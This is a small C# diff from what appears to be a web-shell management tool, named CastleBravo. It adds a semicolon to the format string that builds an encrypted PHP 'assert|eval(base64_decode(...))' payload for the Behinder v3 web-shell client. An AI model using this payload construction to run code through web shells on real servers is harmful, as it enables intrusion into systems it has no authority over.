@@ -613,7 +613,7 @@ namespace C2.Business.CastleBravo.WebShellTool
 
             if (task.ClientVersion == "三代冰蝎")
             {
-                string behinderPayload  = string.Format( "assert|eval(base64_decode('{0}'))", ST.EncodeBase64(payload));                
+                string behinderPayload  = string.Format( "assert|eval(base64_decode('{0}'));", ST.EncodeBase64(payload));                
                 string b = Encrypt(behinderPayload, pass);
                 return b;
                 
